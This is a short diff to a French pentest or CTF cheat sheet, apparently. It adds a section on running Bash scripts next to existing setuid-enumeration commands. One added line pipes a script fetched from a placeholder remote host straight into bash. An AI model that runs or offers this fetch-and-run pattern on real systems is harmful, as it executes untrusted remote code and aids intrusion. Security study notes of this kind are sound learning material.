@@ -39,3 +39,10 @@ find / -group bugtracker 2>/dev/null
 # infos sur un fichier (looking for setuid, suid)
 ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
 ```
+
+## Exécuter un script Bash
+
+```bash
+cat script.sh | bash
+curl http://<ip>/script.sh | bash
+```
